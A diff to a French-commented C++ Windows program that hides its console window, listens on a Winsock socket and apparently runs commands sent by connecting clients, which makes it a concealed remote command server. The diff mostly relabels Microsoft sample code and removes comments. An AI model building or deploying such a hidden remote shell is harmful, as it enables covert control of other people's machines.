@@ -42,7 +42,6 @@ void executeWindowsCommand(const std::string& cmd, std::string& output, std::str
 //FONCTION PRINCIPALE.
 int __cdecl main(void)
 {
-    //CreateService();  //Créer le service.
     FreeConsole();  //Cacher la console.
     setlocale(LC_CTYPE, "fr-FR");  //Pour afficher les accents français.
 
@@ -77,6 +76,7 @@ int __cdecl main(void)
         }
     }
 
+    /* DEBUT CODE MICROSOFT */
     //Initialisation de Winsock.
     iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
     if (iResult != 0)
@@ -123,11 +123,13 @@ int __cdecl main(void)
     }
 
     freeaddrinfo(result);  //Libération de la mémoire allouée.
+    /* FIN CODE MICROSOFT */
 
     while (true)
     {
-        std::cout << std::endl << "-> EN ATTENTE D'UNE CONNEXION ..." << std::endl;  //À enlever !!!
+        std::cout << std::endl << "-> EN ATTENTE D'UNE CONNEXION ..." << std::endl;
 
+        /* DEBUT CODE MICROSOFT */
         //Écoute sur le socket pour les demandes de connexion entrantes.
         iResult = listen(ListenSocket, SOMAXCONN);
         if (iResult == SOCKET_ERROR)
@@ -147,8 +149,9 @@ int __cdecl main(void)
             WSACleanup();
             return 1;
         }
+        /* FIN CODE MICROSOFT */
 
-        std::cout << "---> CONNEXION D'UN CLIENT" << std::endl;  //À enlever !!!
+        std::cout << "---> CONNEXION D'UN CLIENT" << std::endl;
 
         //Le client a accès au serveur.
         do
